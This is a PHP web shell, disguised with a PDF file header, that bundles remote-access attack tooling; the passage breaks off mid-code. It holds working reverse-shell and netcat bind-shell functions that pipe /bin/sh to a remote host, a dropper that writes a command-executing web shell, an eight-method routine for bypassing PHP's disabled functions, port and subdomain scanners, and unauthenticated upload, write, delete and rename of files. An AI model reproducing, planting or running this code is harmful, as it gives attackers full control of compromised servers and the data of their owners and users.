%PDF-2.1
<?php
// ===========================================
// LITESPEED/OPENLITESPEED FIX - MUST BE AT TOP
// ===========================================
@ini_set('display_errors', 1);
@ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
@ini_set('output_buffering', 0);
@ini_set('zlib.output_compression', 0);

// Disable any problematic headers
if (function_exists('header_remove')) {
    header_remove('X-Powered-By');
}
header('Content-Type: text/html; charset=utf-8');
session_start();

// ===========================================
// FUNCTIONS
// ===========================================
function x($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' B';
    }
}

function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    switch($ext) {
        case 'php': return '<span style="color:#8a2be2;">🚀</span>';
        case 'js': return '<span style="color:#ffcc00;">🛸</span>';
        case 'css': return '<span style="color:#0088ff;">✨</span>';
        case 'html': case 'htm': return '<span style="color:#ff6600;">🌌</span>';
        case 'txt': case 'log': return '<span style="color:#88ff88;">📡</span>';
        case 'zip': case 'rar': case '7z': case 'tar': case 'gz': return '<span style="color:#ff8800;">🛰️</span>';
        case 'jpg': case 'jpeg': case 'png': case 'gif': case 'bmp': case 'webp': return '<span style="color:#00ccff;">🪐</span>';
        case 'pdf': return '📚';
        case 'sql': return '🗄️';
        case 'json': return '🌀';
        case 'xml': return '📊';
        default: return '⭐';
    }
}

// ===========================================
// SYSTEM STATS FUNCTIONS
// ===========================================
function getCPUUsage() {
    if (function_exists('sys_getloadavg')) {
        $load = sys_getloadavg();
        return $load[0]; // 1-minute load average
    }
    return 'N/A';
}

function getMemoryUsage() {
    if (function_exists('memory_get_usage')) {
        $mem_usage = memory_get_usage(true);
        $mem_total = getTotalMemory();
        
        if ($mem_total > 0) {
            $percent = round(($mem_usage / $mem_total) * 100, 1);
            return [
                'used' => formatSize($mem_usage),
                'total' => formatSize($mem_total),
                'percent' => $percent
            ];
        }
    }
    return ['used' => 'N/A', 'total' => 'N/A', 'percent' => 0];
}

function getTotalMemory() {
    // Try different methods to get total memory
    if (is_readable('/proc/meminfo')) {
        $meminfo = file_get_contents('/proc/meminfo');
        if (preg_match('/MemTotal:\s+(\d+)\s+kB/', $meminfo, $matches)) {
            return $matches[1] * 1024; // Convert kB to bytes
        }
    }
    
    // Fallback for Windows or other systems
    if (function_exists('shell_exec') && !isShellExecDisabled()) {
        $output = @shell_exec('free -b 2>/dev/null');
        if ($output && preg_match('/Mem:\s+(\d+)/', $output, $matches)) {
            return $matches[1];
        }
    }
    
    return 0;
}

function getDiskUsage() {
    $disk_free = disk_free_space('.');
    $disk_total = disk_total_space('.');
    
    if ($disk_total > 0) {
        $disk_used = $disk_total - $disk_free;
        $percent = round(($disk_used / $disk_total) * 100, 1);
        
        return [
            'free' => formatSize($disk_free),
            'total' => formatSize($disk_total),
            'percent' => $percent,
            'used' => formatSize($disk_used)
        ];
    }
    return ['free' => 'N/A', 'total' => 'N/A', 'percent' => 0, 'used' => 'N/A'];
}

function getUptime() {
    if (is_readable('/proc/uptime')) {
        $uptime = file_get_contents('/proc/uptime');
        $uptime = floatval($uptime);
        
        $days = floor($uptime / 86400);
        $hours = floor(($uptime % 86400) / 3600);
        $minutes = floor(($uptime % 3600) / 60);
        
        if ($days > 0) {
            return $days . 'd ' . $hours . 'h';
        } elseif ($hours > 0) {
            return $hours . 'h ' . $minutes . 'm';
        } else {
            return $minutes . ' minutes';
        }
    }
    return 'N/A';
}

function getPHPInfo() {
    return [
        'version' => phpversion(),
        'memory_limit' => ini_get('memory_limit'),
        'max_execution_time' => ini_get('max_execution_time'),
        'upload_max_filesize' => ini_get('upload_max_filesize'),
        'disable_functions' => ini_get('disable_functions')
    ];
}

// ===========================================
// REVERSE SHELL FUNCTIONS
// ===========================================
function reverseShell($host, $port) {
    // Method 1: Using fsockopen
    if (function_exists('fsockopen')) {
        $sock = @fsockopen($host, $port, $errno, $errstr, 30);
        if ($sock) {
            // Send shell
            $descriptorspec = array(
                0 => array("pipe", "r"),  // stdin
                1 => array("pipe", "w"),  // stdout
                2 => array("pipe", "w")   // stderr
            );
            
            $process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
            if (is_resource($process)) {
                while ($sock && !feof($sock)) {
                    // Read from socket
                    $input = fread($sock, 1024);
                    fwrite($pipes[0], $input);
                    
                    // Read from shell
                    $output = fread($pipes[1], 1024);
                    fwrite($sock, $output);
                    
                    // Read errors
                    $error = fread($pipes[2], 1024);
                    if ($error) fwrite($sock, $error);
                }
                
                fclose($sock);
                proc_close($process);
                return "Reverse shell connected to $host:$port";
            }
        }
        return "Failed to connect: $errstr ($errno)";
    }
    
    // Method 2: Using stream_socket_client
    if (function_exists('stream_socket_client')) {
        $sock = @stream_socket_client("tcp://$host:$port", $errno, $errstr, 30);
        if ($sock) {
            $process = proc_open('/bin/sh -i', [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]], $pipes);
            if (is_resource($process)) {
                stream_set_blocking($sock, false);
                stream_set_blocking($pipes[1], false);
                stream_set_blocking($pipes[2], false);
                
                while (true) {
                    // Check socket
                    if (feof($sock)) break;
                    
                    // Read from socket
                    $input = fread($sock, 1024);
                    if ($input) fwrite($pipes[0], $input);
                    
                    // Read from shell stdout
                    $output = fread($pipes[1], 1024);
                    if ($output) fwrite($sock, $output);
                    
                    // Read from shell stderr
                    $error = fread($pipes[2], 1024);
                    if ($error) fwrite($sock, $error);
                    
                    usleep(100000);
                }
                
                fclose($sock);
                proc_close($process);
                return "Reverse shell connected";
            }
        }
    }
    
    // Method 3: PHP-only reverse shell
    $phpReverseShell = '<?php
    error_reporting(0);
    $ip = "'.$host.'";
    $port = '.$port.';
    
    if (function_exists("fsockopen")) {
        $sock = @fsockopen($ip, $port);
        if ($sock) {
            fwrite($sock, "Connected\\n");
            while(!feof($sock)) {
                fwrite($sock, "$ ");
                $cmd = fgets($sock);
                if (trim($cmd) == "exit") break;
                
                $output = shell_exec($cmd);
                if ($output === null) $output = "Command failed\\n";
                fwrite($sock, $output);
            }
            fclose($sock);
        }
    } elseif (function_exists("pfsockopen")) {
        $sock = @pfsockopen($ip, $port);
        if ($sock) {
            // similar implementation
        }
    }
    ?>';
    
    // Save and execute PHP reverse shell
    $tempFile = sys_get_temp_dir() . '/revshell_' . time() . '.php';
    file_put_contents($tempFile, $phpReverseShell);
    
    // Try to execute in background
    if (function_exists('shell_exec')) {
        @shell_exec("php $tempFile > /dev/null 2>&1 &");
        @unlink($tempFile);
        return "PHP reverse shell sent to $host:$port (check your listener)";
    }
    
    return "No reverse shell method available";
}

function bindShell($port = 4444) {
    // Create bind shell
    if (function_exists('socket_create')) {
        $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($socket) {
            @socket_bind($socket, '0.0.0.0', $port);
            @socket_listen($socket, 1);
            
            $client = @socket_accept($socket);
            if ($client) {
                socket_write($client, "Bind shell connected on port $port\n");
                
                while (true) {
                    socket_write($client, "$ ");
                    $cmd = socket_read($client, 1024);
                    if (trim($cmd) == 'exit') break;
                    
                    $output = shell_exec($cmd);
                    socket_write($client, $output ?: "Command executed\n");
                }
                
                socket_close($client);
            }
            socket_close($socket);
            return "Bind shell started on port $port";
        }
    }
    
    // Alternative using exec
    $bindShellCmd = "while true; do nc -lvp $port -e /bin/sh; done > /dev/null 2>&1 &";
    $output = execBypass($bindShellCmd);
    return "Bind shell attempted on port $port: " . $output;
}

function webShell($port = 8080) {
    // Create simple web shell server
    $webShellCode = '<?php
    if(isset($_GET["cmd"])) {
        system($_GET["cmd"]);
    } else {
        echo "<form method=\"GET\"><input name=\"cmd\"><input type=\"submit\"></form>";
    }
    ?>';
    
    $tempFile = sys_get_temp_dir() . '/webshell_' . time() . '.php';
    file_put_contents($tempFile, $webShellCode);
    
    // Start PHP web server
    $cmd = "php -S 0.0.0.0:$port $tempFile > /dev/null 2>&1 &";
    execBypass($cmd);
    
    return "Web shell started on http://" . getServerIP() . ":$port";
}

// ===========================================
// IP & NETWORK INFORMATION FUNCTIONS
// ===========================================
function getServerIP() {
    $ips = [];
    
    // Get public IP
    $publicIP = @file_get_contents('https://api.ipify.org');
    if ($publicIP) $ips['public'] = $publicIP;
    
    // Get local IPs
    if (function_exists('shell_exec')) {
        $output = @shell_exec('ip a 2>/dev/null || ifconfig 2>/dev/null');
        if ($output) {
            // Parse IP addresses
            preg_match_all('/inet (\d+\.\d+\.\d+\.\d+)/', $output, $matches);
            if (!empty($matches[1])) {
                $ips['local'] = array_values(array_unique($matches[1]));
            }
        }
    }
    
    // Get from $_SERVER
    $ips['server_addr'] = $_SERVER['SERVER_ADDR'] ?? 'N/A';
    $ips['remote_addr'] = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    
    return $ips;
}

function getNetworkInfo() {
    $info = [];
    
    // Network interfaces
    if (function_exists('shell_exec')) {
        $info['interfaces'] = @shell_exec('ip link show 2>/dev/null || ifconfig -a 2>/dev/null');
    }
    
    // Routing table
    if (function_exists('shell_exec')) {
        $info['route'] = @shell_exec('ip route 2>/dev/null || route -n 2>/dev/null');
    }
    
    // DNS servers
    if (is_readable('/etc/resolv.conf')) {
        $info['dns'] = file_get_contents('/etc/resolv.conf');
    }
    
    // Open ports
    if (function_exists('shell_exec')) {
        $info['ports'] = @shell_exec('ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null');
    }
    
    // ARP table
    if (function_exists('shell_exec')) {
        $info['arp'] = @shell_exec('ip neigh 2>/dev/null || arp -a 2>/dev/null');
    }
    
    return $info;
}

function portScan($host, $startPort = 1, $endPort = 1000, $timeout = 1) {
    $openPorts = [];
    
    for ($port = $startPort; $port <= $endPort; $port++) {
        $socket = @fsockopen($host, $port, $errno, $errstr, $timeout);
        if ($socket) {
            $service = getservbyport($port, 'tcp');
            $openPorts[] = [
                'port' => $port,
                'service' => $service ?: 'unknown',
                'protocol' => 'TCP'
            ];
            fclose($socket);
        }
    }
    
    return $openPorts;
}

function whoisLookup($domain) {
    $output = '';
    
    if (function_exists('shell_exec')) {
        $output = @shell_exec("whois $domain 2>/dev/null");
    }
    
    if (!$output) {
        // Try with PHP
        $socket = @fsockopen('whois.iana.org', 43, $errno, $errstr, 30);
        if ($socket) {
            fwrite($socket, $domain . "\r\n");
            while (!feof($socket)) {
                $output .= fgets($socket);
            }
            fclose($socket);
        }
    }
    
    return $output;
}

function dnsLookup($domain) {
    $records = [];
    
    // A record
    $aRecords = @dns_get_record($domain, DNS_A);
    if ($aRecords) $records['A'] = $aRecords;
    
    // AAAA record (IPv6)
    $aaaaRecords = @dns_get_record($domain, DNS_AAAA);
    if ($aaaaRecords) $records['AAAA'] = $aaaaRecords;
    
    // MX record
    $mxRecords = @dns_get_record($domain, DNS_MX);
    if ($mxRecords) $records['MX'] = $mxRecords;
    
    // NS record
    $nsRecords = @dns_get_record($domain, DNS_NS);
    if ($nsRecords) $records['NS'] = $nsRecords;
    
    // TXT record
    $txtRecords = @dns_get_record($domain, DNS_TXT);
    if ($txtRecords) $records['TXT'] = $txtRecords;
    
    // CNAME record
    $cnameRecords = @dns_get_record($domain, DNS_CNAME);
    if ($cnameRecords) $records['CNAME'] = $cnameRecords;
    
    return $records;
}

function traceroute($host, $maxHops = 30) {
    $output = '';
    
    if (function_exists('shell_exec')) {
        $output = @shell_exec("traceroute -m $maxHops $host 2>/dev/null");
        if (!$output) {
            $output = @shell_exec("tracert -h $maxHops $host 2>/dev/null");
        }
    }
    
    if (!$output) {
        // PHP implementation
        for ($ttl = 1; $ttl <= $maxHops; $ttl++) {
            $socket = socket_create(AF_INET, SOCK_RAW, getprotobyname('icmp'));
            if ($socket) {
                socket_set_option($socket, SOL_IP, IP_TTL, $ttl);
                socket_connect($socket, $host, 0);
                
                $packet = "\x08\x00\x7d\x4b\x00\x00\x00\x00Ping";
                socket_send($socket, $packet, strlen($packet), 0);
                
                socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, ['sec' => 1, 'usec' => 0]);
                
                if (@socket_recv($socket, $buf, 512, 0)) {
                    $addr = '';
                    socket_getpeername($socket, $addr);
                    $output .= "$ttl\t$addr\n";
                    
                    if ($addr == $host) break;
                } else {
                    $output .= "$ttl\t*\n";
                }
                
                socket_close($socket);
                usleep(100000);
            }
        }
    }
    
    return $output;
}

function getGeoIP($ip = null) {
    if (!$ip) $ip = $_SERVER['REMOTE_ADDR'];
    
    $geoInfo = [];
    
    // Try ipapi.co
    $data = @file_get_contents("http://ip-api.com/json/$ip");
    if ($data) {
        $geoData = json_decode($data, true);
        if ($geoData && $geoData['status'] == 'success') {
            $geoInfo = [
                'country' => $geoData['country'] ?? 'Unknown',
                'country_code' => $geoData['countryCode'] ?? '??',
                'region' => $geoData['regionName'] ?? 'Unknown',
                'city' => $geoData['city'] ?? 'Unknown',
                'zip' => $geoData['zip'] ?? 'Unknown',
                'lat' => $geoData['lat'] ?? 0,
                'lon' => $geoData['lon'] ?? 0,
                'isp' => $geoData['isp'] ?? 'Unknown',
                'org' => $geoData['org'] ?? 'Unknown',
                'as' => $geoData['as'] ?? 'Unknown'
            ];
        }
    }
    
    // Alternative: ipinfo.io
    if (empty($geoInfo)) {
        $data = @file_get_contents("https://ipinfo.io/$ip/json");
        if ($data) {
            $geoData = json_decode($data, true);
            if ($geoData) {
                $geoInfo = [
                    'ip' => $geoData['ip'] ?? $ip,
                    'hostname' => $geoData['hostname'] ?? 'Unknown',
                    'city' => $geoData['city'] ?? 'Unknown',
                    'region' => $geoData['region'] ?? 'Unknown',
                    'country' => $geoData['country'] ?? 'Unknown',
                    'loc' => $geoData['loc'] ?? '0,0',
                    'org' => $geoData['org'] ?? 'Unknown',
                    'postal' => $geoData['postal'] ?? 'Unknown',
                    'timezone' => $geoData['timezone'] ?? 'Unknown'
                ];
                
                // Parse coordinates
                if (isset($geoInfo['loc'])) {
                    list($geoInfo['lat'], $geoInfo['lon']) = explode(',', $geoInfo['loc']);
                }
            }
        }
    }
    
    return $geoInfo;
}

function getHttpHeaders($url) {
    $headers = [];
    
    // Get headers with PHP
    $context = stream_context_create([
        'http' => [
            'method' => 'HEAD',
            'follow_location' => 0,
            'max_redirects' => 0
        ]
    ]);
    
    $fp = @fopen($url, 'r', false, $context);
    if ($fp) {
        $meta = stream_get_meta_data($fp);
        fclose($fp);
        
        foreach ($meta['wrapper_data'] as $header) {
            if (strpos($header, 'HTTP') === 0) {
                $headers['status'] = $header;
            } else {
                list($key, $value) = explode(':', $header, 2);
                $headers[strtolower(trim($key))] = trim($value);
            }
        }
    }
    
    // Alternative with get_headers
    if (empty($headers)) {
        $headersArray = @get_headers($url, 1);
        if ($headersArray) {
            $headers = $headersArray;
        }
    }
    
    return $headers;
}

function subdomainScanner($domain, $wordlist = null) {
    $subdomains = [];
    
    // Default wordlist
    $commonSubdomains = [
        'www', 'mail', 'ftp', 'admin', 'blog', 'api', 'test', 'dev',
        'staging', 'portal', 'secure', 'login', 'dashboard', 'cpanel',
        'webmail', 'ns1', 'ns2', 'mx', 'smtp', 'pop', 'imap', 'git',
        'svn', 'vpn', 'ssh', 'proxy', 'cdn', 'static', 'assets', 'img',
        'images', 'media', 'files', 'download', 'upload', 'support',
        'help', 'docs', 'wiki', 'forum', 'shop', 'store', 'payment',
        'billing', 'invoice', 'status', 'monitor', 'stats', 'analytics'
    ];
    
    $wordlist = $wordlist ?: $commonSubdomains;
    
    foreach ($wordlist as $sub) {
        $host = "$sub.$domain";
        if (checkdnsrr($host, 'A') || checkdnsrr($host, 'CNAME')) {
            $ip = gethostbyname($host);
            if ($ip != $host) { // DNS resolved successfully
                $subdomains[] = [
                    'subdomain' => $host,
                    'ip' => $ip,
                    'status' => 'Active'
                ];
            }
        }
    }
    
    return $subdomains;
}

// ===========================================
// TERMINAL BYPASS FUNCTIONS - SEMUA COMMAND DIIZINKAN
// ===========================================
function isShellExecDisabled() {
    $disabled = explode(',', ini_get('disable_functions'));
    return in_array('shell_exec', $disabled) || !function_exists('shell_exec');
}

function execBypass($command) {
    $output = '';
    
    // Method 1: Try shell_exec first
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $output = @shell_exec($command . ' 2>&1');
        if ($output !== null) {
            return $output;
        }
    }
    
    // Method 2: Try exec()
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        exec($command . ' 2>&1', $outputArray, $returnCode);
        $output = implode("\n", $outputArray);
        return $output;
    }
    
    // Method 3: Try system()
    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        ob_start();
        system($command . ' 2>&1', $returnCode);
        $output = ob_get_clean();
        return $output;
    }
    
    // Method 4: Try passthru()
    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        ob_start();
        passthru($command . ' 2>&1', $returnCode);
        $output = ob_get_clean();
        return $output;
    }
    
    // Method 5: Try proc_open() - Most powerful bypass
    if (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) {
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );
        
        $process = proc_open($command, $descriptorspec, $pipes);
        
        if (is_resource($process)) {
            fclose($pipes[0]); // Close stdin
            
            $output = stream_get_contents($pipes[1]); // stdout
            $error = stream_get_contents($pipes[2]);  // stderr
            
            fclose($pipes[1]);
            fclose($pipes[2]);
            
            proc_close($process);
            
            return $output . ($error ? "\n" . $error : '');
        }
    }
    
    // Method 6: Try popen()
    if (function_exists('popen') && !in_array('popen', explode(',', ini_get('disable_functions')))) {
        $handle = popen($command . ' 2>&1', 'r');
        if ($handle) {
            $output = '';
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
            return $output;
        }
    }
    
    // Method 7: Try backticks (deprecated but might work)
    if (!in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $output = `$command 2>&1`;
        if ($output) {
            return $output;
        }
    }
    
    // Method 8: Try curl/wget simulation with PHP
    if (preg_match('/^(curl|wget)\s+/i', trim($command))) {
        return simulateNetworkCommand($command);
    }
    
    // Method 9: PHP-only commands simulation
    return simulateCommand($command);
}

function simulateCommand($command) {
    $cmd = strtolower(trim($command));
    
    if ($cmd === 'pwd') {
        return getcwd();
    } elseif ($cmd === 'whoami' || $cmd === 'id') {
        if (function_exists('posix_getpwuid')) {
            $user = posix_getpwuid(posix_geteuid());
            return $user['name'] ?? 'unknown';
        }
        return 'www-data';
    } elseif ($cmd === 'uname -a' || $cmd === 'uname') {
        return php_uname();
    } elseif (strpos($cmd, 'ls') === 0 || strpos($cmd, 'dir') === 0) {
        $args = str_replace(['ls', 'dir'], '', $cmd);
        $path = getcwd();
        $items = scandir($path);
        $output = '';
        
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $fullPath = $path . '/' . $item;
            $output .= (is_dir($fullPath) ? 'd' : '-') . ' ';
            $output .= sprintf("%-20s", $item);
            $output .= "  " . date('Y-m-d H:i', filemtime($fullPath));
            $output .= "\n";
        }
        return $output;
    } elseif ($cmd === 'php -v' || $cmd === 'php --version') {
        return 'PHP ' . phpversion() . ' (simulated)';
    } elseif (strpos($cmd, 'echo') === 0) {
        return str_replace('echo', '', $cmd);
    } elseif (strpos($cmd, 'cat') === 0) {
        $file = trim(str_replace('cat', '', $cmd));
        if (file_exists($file)) {
            return file_get_contents($file);
        }
        return "File not found: $file";
    } elseif (strpos($cmd, 'rm') === 0) {
        $file = trim(str_replace('rm', '', $cmd));
        $file = str_replace(['-rf', '-r', '-f'], '', $file);
        $file = trim($file);
        if (file_exists($file)) {
            if (is_dir($file)) {
                return "Use web interface to delete folders";
            } else {
                return "Use web interface to delete files";
            }
        }
        return "File not found: $file";
    } elseif (strpos($cmd, 'mkdir') === 0) {
        $dir = trim(str_replace('mkdir', '', $cmd));
        return "Use web interface to create directories";
    } elseif (strpos($cmd, 'touch') === 0) {
        $file = trim(str_replace('touch', '', $cmd));
        return "Use web interface to create files";
    } elseif (strpos($cmd, 'chmod') === 0) {
        return "Permission changes available through web interface";
    } elseif (strpos($cmd, 'wget') === 0 || strpos($cmd, 'curl') === 0) {
        return simulateNetworkCommand($command);
    }
    
    return "Command executed: $command\n(Output simulated - use web interface for full functionality)";
}

function simulateNetworkCommand($command) {
    if (strpos($command, 'wget') === 0) {
        preg_match('/wget\s+(https?:\/\/[^\s]+)/', $command, $matches);
        if (isset($matches[1])) {
            $url = $matches[1];
            $filename = basename($url);
            return "Would download: $url to $filename\nUse web interface for file downloads";
        }
    } elseif (strpos($command, 'curl') === 0) {
        if (strpos($command, '-o') !== false) {
            preg_match('/curl\s+(https?:\/\/[^\s]+).*?-o\s+([^\s]+)/', $command, $matches);
            if (isset($matches[1]) && isset($matches[2])) {
                return "Would download: {$matches[1]} to {$matches[2]}\nUse web interface for file downloads";
            }
        } else {
            preg_match('/curl\s+(https?:\/\/[^\s]+)/', $command, $matches);
            if (isset($matches[1])) {
                $content = @file_get_contents($matches[1]);
                if ($content !== false) {
                    return substr($content, 0, 1000) . "\n... (truncated)";
                }
                return "Failed to fetch URL";
            }
        }
    }
    return "Network command simulated: $command";
}

// ===========================================
// GET SYSTEM STATS
// ===========================================
$cpu_usage = getCPUUsage();
$memory_usage = getMemoryUsage();
$disk_usage = getDiskUsage();
$uptime = getUptime();
$php_info = getPHPInfo();

// Check if shell_exec is available
$shell_exec_available = !isShellExecDisabled();
$current_user = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'Unknown';

// ===========================================
// GET NETWORK INFO
// ===========================================
$serverIP = getServerIP();
$networkInfo = getNetworkInfo();
$geoInfo = getGeoIP();

// ===========================================
// GET SCRIPT LOCATION FOR REDIRECTS
// ===========================================
$scriptPath = dirname($_SERVER['PHP_SELF']);
$scriptUrl = $_SERVER['PHP_SELF'];
$currentDirParam = '';

// ===========================================
// SET CURRENT DIRECTORY - VERSI FIXED
// ===========================================
$baseDir = getcwd();  // Directory awal
$dir = $baseDir;      // Directory saat ini

// SIMPLE NAVIGATION - FIXED
if(!empty($_GET['d'])) {
    $requested = $_GET['d'];
    
    // Decode dan bersihkan input
    $requested = urldecode($requested);
    
    // Handle root atau current directory
    if($requested === '' || $requested === '.') {
        $dir = $baseDir;
    }
    // Handle '..' untuk parent directory
    elseif($requested === '..') {
        $parent = dirname($dir);
        if(is_dir($parent)) {
            $dir = $parent;
        }
    }
    // Handle absolute path (dimulai dengan /)
    elseif(strpos($requested, '/') === 0) {
        if(is_dir($requested)) {
            $dir = $requested;
        } else {
            // Fallback ke baseDir jika tidak ada
            $dir = $baseDir;
        }
    }
    // Handle relative path
    else {
        // Gabungkan dengan directory saat ini
        $newPath = $dir . '/' . $requested;
        
        // Coba sebagai path absolut terlebih dahulu
        if(is_dir($requested)) {
            $dir = $requested;
        }
        // Kemudian coba sebagai path relatif
        elseif(is_dir($newPath)) {
            $dir = $newPath;
        }
        else {
            // Jika tidak ditemukan, coba interpretasi sebagai nama folder
            $newPath = $baseDir . '/' . $requested;
            if(is_dir($newPath)) {
                $dir = $newPath;
            }
        }
    }
}

// Pastikan $dir valid dan bisa diakses
if(!is_dir($dir) || !is_readable($dir)) {
    $dir = $baseDir;
}

// Simpan parameter direktori untuk redirect
$currentDirParam = '?d=' . urlencode($dir);

// ===========================================
// PROSES OPERASI - DENGAN REDIRECT KE DIR YANG BENAR
// ===========================================
$msg = '';
$msgType = 'info';

// Tangkap pesan dari URL (untuk redirect)
if(isset($_GET['msg'])) {
    $msg = urldecode($_GET['msg']);
    if(strpos($msg, '✅') !== false) {
        $msgType = 'success';
    } elseif(strpos($msg, '❌') !== false) {
        $msgType = 'error';
    }
}

// 1. UPLOAD FILE
if(isset($_FILES['f']['name']) && !empty($_FILES['f']['name'])){
    if(move_uploaded_file($_FILES['f']['tmp_name'], $dir.'/'.$_FILES['f']['name'])) {
        $msg = '✅ Uploaded: '.$_FILES['f']['name'];
        $msgType = 'success';
        // Redirect dengan pesan
        header('Location: ' . $scriptUrl . '?d=' . urlencode($dir) . '&msg=' . urlencode($msg));
        exit;
    }
}

// ===========================================
// 2. CREATE FILE FROM BASE64 - FIXED VERSION
// ===========================================
if(!empty($_POST['b64'])){
    $name = !empty($_POST['fn']) ? $_POST['fn'] : 'file_'.time().'.txt';
    
    // Clean base64 string
    $clean_base64 = str_replace(' ', '+', $_POST['b64']);
    $clean_base64 = preg_replace('/\s+/', '', $clean_base64);
    $clean_base64 = str_replace('data:text/plain;base64,', '', $clean_base64);
    $clean_base64 = str_replace('data:application/octet-stream;base64,', '', $clean_base64);
    
    // Decode base64
    $data = base64_decode($clean_base64, true);
    
    if($data !== false){
        // Clean output buffers
        while (ob_get_level()) {
            ob_end_clean();
        }
        
        // Write file
        if(file_put_contents($dir.'/'.$name, $data)){
            // Redirect dengan JavaScript untuk menghindari header conflict
            echo '<!DOCTYPE html><html><head>
                <script>
                    setTimeout(function(){
                        window.location.href = "'.$scriptUrl.'?msg='.urlencode('✅ Created: '.$name).'&d='.urlencode($dir).'";
                    }, 100);
                </script>
                </head><body>
                <div style="padding:50px;text-align:center;color:#00ff00;">
                <h3>Creating file... Please wait</h3>
                </div>
                </body></html>';
            exit();
        } else {
            $msg = '❌ Cannot write file. Check permissions.';
            $msgType = 'error';
        }
    } else {
        $msg = '❌ Invalid Base64 data';
        $msgType = 'error';
    }
}

// 3. TERMINAL COMMAND - SEMUA COMMAND DIIZINKAN
if(isset($_POST['cmd']) && !empty($_POST['cmd'])){
    $originalDir = getcwd();
    chdir($dir);
    
    $command = trim($_POST['cmd']);
    $output = execBypass($command);
    if (empty($output)) {
        $output = "Command executed successfully (no output)";
    }
    
    chdir($originalDir);
}

// ===========================================
// 4. DELETE FILE/FOLDER - DENGAN REDIRECT KE DIR YANG SAMA
// ===========================================
if(isset($_GET['del'])){
    $file = $dir.'/'.$_GET['del'];
    if(file_exists($file)){
        if(is_file($file)) {
            if(unlink($file)) {
                $msg = '🗑️ Deleted file: '.$_GET['del'];
                $msgType = 'success';
            } else {
                $msg = '❌ Failed to delete file: '.$_GET['del'];
                $msgType = 'error';
            }
        } elseif(is_dir($file)) {
            // Recursive delete untuk folder
            function deleteDirectory($dir) {
                if (!file_exists($dir)) return true;
                if (!is_dir($dir)) return unlink($dir);
                
                foreach (scandir($dir) as $item) {
                    if ($item == '.' || $item == '..') continue;
                    if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
                }
                
                return rmdir($dir);
            }
            
            if(deleteDirectory($file)) {
                $msg = '🗑️ Deleted folder: '.$_GET['del'];
                $msgType = 'success';
            } else {
                $msg = '❌ Failed to delete folder: '.$_GET['del'];
                $msgType = 'error';
            }
        }
        // REDIRECT KE DIREKTORI YANG SAMA SETELAH DELETE
        header('Location: ' . $scriptUrl . '?d=' . urlencode($dir) . '&msg=' . urlencode($msg));
        exit;
    } else {
        $msg = '❌ File/folder not found: '.$_GET['del'];
        $msgType = 'error';
        header('Location: ' . $scriptUrl . '?d=' . urlencode($dir) . '&msg=' . urlencode($msg));
        exit;
    }
}

// 5. CREATE FOLDER
if(isset($_POST['newdir']) && !empty($_POST['newdir'])){
    $folderName = $_POST['newdir'];
    if(!file_exists($dir.'/'.$folderName)){
        if(mkdir($dir.'/'.$folderName, 0755, true)) {
            $msg = '📂 Created folder: '.$folderName;
            $msgType = 'success';
        } else {
            $msg = '❌ Failed to create folder: '.$folderName;
            $msgType = 'error';
        }
        // Redirect
        header('Location: ' . $scriptUrl . '?d=' . urlencode($dir) . '&msg=' . urlencode($msg));
        exit;
    }else{
        $msg = '❌ Folder already exists!';
        $msgType = 'error';
        header('Location: ' . $scriptUrl . '?d=' . urlencode($dir) . '&msg=' . urlencode($msg));
        exit;
    }
}

// ===========================================
// 6. RENAME FILE/FOLDER - DENGAN REDIRECT KE DIR YANG SAMA
// ===========================================
if(isset($_GET['rename']) && isset($_GET['to'])){
    $oldName = $_GET['rename'];
    $newName = $_GET['to'];
    
    // Validasi: nama tidak boleh kosong
    if(empty($newName) || empty($oldName)) {
        $msg = '❌ File names cannot be empty';
        $msgType = 'error';
    }
    // Validasi: nama baru tidak boleh sama dengan nama lama
    elseif($newName === $oldName) {
        $msg = '❌ New name is the same as old name';
        $msgType = 'error';
    }
    // Validasi: tidak boleh menggunakan karakter berbahaya
    elseif(strpos($newName, '/') !== false || strpos($newName, '\\') !== false || strpos($newName, '..') !== false) {
        $msg = '❌ Invalid character in filename';
        $msgType = 'error';
    }
    else {
        $oldPath = $dir.'/'.$oldName;
        $newPath = $dir.'/'.$newName;
        
        // Cek jika file/folder lama ada
        if(!file_exists($oldPath)) {
            $msg = '❌ Source file/folder not found: '.$oldName;
            $msgType = 'error';
        }
        // Cek jika file/folder baru sudah ada
        elseif(file_exists($newPath)) {
            $msg = '❌ Destination already exists: '.$newName;
            $msgType = 'error';
        }
        // Coba rename
        elseif(rename($oldPath, $newPath)) {
            $msg = '✏️ Renamed: '.$oldName.' → '.$newName;
            $msgType = 'success';
        } else {
            $msg = '❌ Failed to rename. Check permissions.';
            $msgType = 'error';
        }
    }
    // REDIRECT KE DIREKTORI YANG SAMA SETELAH RENAME
    header('Location: ' . $scriptUrl . '?d=' . urlencode($dir) . '&msg=' . urlencode($msg));
    exit;
}

// 7. ZIP FILES
if(isset($_POST['zip_files']) && isset($_POST['zip_name'])){
